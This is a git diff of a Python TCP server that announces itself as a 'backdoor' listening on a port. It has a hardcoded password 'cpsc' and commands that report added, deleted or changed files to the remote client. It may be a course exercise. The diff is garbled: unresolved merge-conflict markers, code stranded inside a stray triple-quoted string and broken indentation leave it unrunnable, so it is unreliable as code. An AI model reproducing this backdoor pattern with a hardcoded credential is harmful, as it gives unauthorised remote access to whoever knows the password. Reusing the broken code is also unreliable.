@@ -5,7 +5,6 @@ import difflib
 import hashlib
 class MyTCPHandler(socketserver.BaseRequestHandler):
 
-   
    BUFFER_SIZE = 4096
    def handle(self):
 
@@ -26,7 +25,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
        descriptions["who"] = 'who - list user[s] currently logged in'
 
 
-       file_hash = {}
+       #file_hash = {}
 
        password = "cpsc"
 
@@ -165,6 +164,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                                buff = afile.read()
                                hasher.update(buff)
                        file_hash2[path] = hasher.hexdigest()
+
                    
                        if ((path in file_hash2.keys()) and (path not in file_hash.keys())):      #in the new contents but not in original, which means it was added
                          self.request.sendall(bytearray(path + " was added" + "\n", "utf-8"))
@@ -183,18 +183,45 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                          
 
                    difference = difflib.ndiff(file_hash[path], file_hash2[path])
+                       print(hasher.hexdigest())
+                   for path in file_hash.keys():
+                       if ((path in file_hash.keys()) and (path not in file_hash2.keys())):
+                           self.request.sendall(bytearray(path + " - was deleted\n", "utf-8"))
+                         
+                       if ((path in file_hash2.keys()) and (path in file_hash.keys())):      #in the new contents but not in original, which means it was added
+                           if file_hash.get(path) != file_hash2.get(path):
+                               self.request.sendall(bytearray(path + " - was changed\n", "utf-8"))
+                         
+                   for path in file_hash2.keys():
+                       if ((path in file_hash2.keys()) and (path not in file_hash.keys())):
+                           self.request.sendall(bytearray(path + " - was added\n", "utf-8"))
+
+                         
+
+                   '''difference = difflib.ndiff(file_hash[path], file_hash2[path])
+>>>>>>> 45f8d5248509f634688033d3fed7371d446c7af6
+>>>>>>> 8f20cc90f82fd06335820509b4880fd21679a728
                    for a in difference:
                        if len(a.split()) > 1:                   # prevent going out of index
                            b = a.split(None, 1)
                            del b[0]
                            b = "".join(b)
                            if a.split()[0] == "+":              # check if added
+<<<<<<< HEAD
+                               self.request.sendall(bytearray(b.strip() + " - was added\n", "utf-8"))
+                           elif a.split()[0] == "-":            # check if deleted
+                               self.request.sendall(bytearray(b.strip() + " - was deleted\n", "utf-8"))
+                           elif a.split()[0] == "?":            # check if changed
+                               self.request.sendall(bytearray(b.strip() + " - was changed\n", "utf-8"))
+                   self.request.sendall(bytearray("\n".join(list(difference)), "utf-8"))
+=======
                                self.request.sendall(bytearray(path + " - was added\n", "utf-8"))
                            elif a.split()[0] == "-":            # check if deleted
                                self.request.sendall(bytearray(path + " - was deleted\n", "utf-8"))
                            elif a.split()[0] == "?":            # check if changed
                                self.request.sendall(bytearray(path + " - was changed\n", "utf-8"))
                       self.request.sendall(bytearray("\n".join(list(difference)), "utf-8"))'''
+
                    continue
 
                 # help [cmd]
@@ -249,6 +276,7 @@ if __name__ == "__main__":
    HOST, PORT = "localhost", int(sys.argv[1])
    server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
    print("backdoor listening on port ", PORT)
+   file_hash = {}
    server.serve_forever()
   
    
